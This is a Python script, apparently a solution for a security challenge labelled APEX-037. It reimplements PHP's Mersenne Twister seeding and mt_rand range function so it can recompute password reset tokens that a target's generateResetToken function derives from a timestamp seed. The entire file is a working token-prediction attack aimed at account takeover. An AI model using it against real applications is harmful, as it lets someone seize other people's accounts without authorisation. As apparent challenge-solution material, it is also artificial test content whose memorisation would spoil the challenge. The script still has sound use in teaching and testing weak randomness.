#!/usr/bin/env python3
"""PHP's `mt_srand(seed)` followed by 32 calls to `mt_rand(0, 25)`.

Reimplemented here because the token is a pure function of the seed and the
seed is a timestamp, which is the whole point of APEX-037: nothing has to be
intercepted when it can be recomputed.

PHP 7.1 and later use plain MT19937 and reject-sample a range rather than
scaling it, so this is the reference algorithm with PHP's range function on
top. The character set is the one `generateResetToken` uses.
"""

import sys

N, M = 624, 397
MATRIX_A = 0x9908B0DF
UPPER, LOWER = 0x80000000, 0x7FFFFFFF
MASK32 = 0xFFFFFFFF
CHARSET = "abcdefghijklmnopqrstuvwxyz"


class MersenneTwister:
    def __init__(self, seed):
        self.state = [0] * N
        self.state[0] = seed & MASK32
        for i in range(1, N):
            previous = self.state[i - 1]
            self.state[i] = (
                1812433253 * (previous ^ (previous >> 30)) + i
            ) & MASK32
        self.at = N

    def _twist(self):
        for i in range(N):
            y = (self.state[i] & UPPER) | (self.state[(i + 1) % N] & LOWER)
            next_word = self.state[(i + M) % N] ^ (y >> 1)
            if y & 1:
                next_word ^= MATRIX_A
            self.state[i] = next_word & MASK32
        self.at = 0

    def next(self):
        if self.at >= N:
            self._twist()
        y = self.state[self.at]
        self.at += 1
        y ^= y >> 11
        y ^= (y << 7) & 0x9D2C5680
        y ^= (y << 15) & 0xEFC60000
        y ^= y >> 18
        return y & MASK32

    def range(self, low, high):
        """`mt_rand(low, high)`: rejection sampling, not scaling."""
        count = high - low + 1
        if count & (count - 1) == 0:            # a power of two needs no rejection
            return low + (self.next() & (count - 1))
        limit = MASK32 - (MASK32 % count) - 1
        drawn = self.next()
        while drawn > limit:
            drawn = self.next()
        return low + (drawn % count)


def token_for(seed, length=32):
    mt = MersenneTwister(seed)
    return "".join(CHARSET[mt.range(0, len(CHARSET) - 1)] for _ in range(length))


if __name__ == "__main__":
    print(token_for(int(sys.argv[1])))
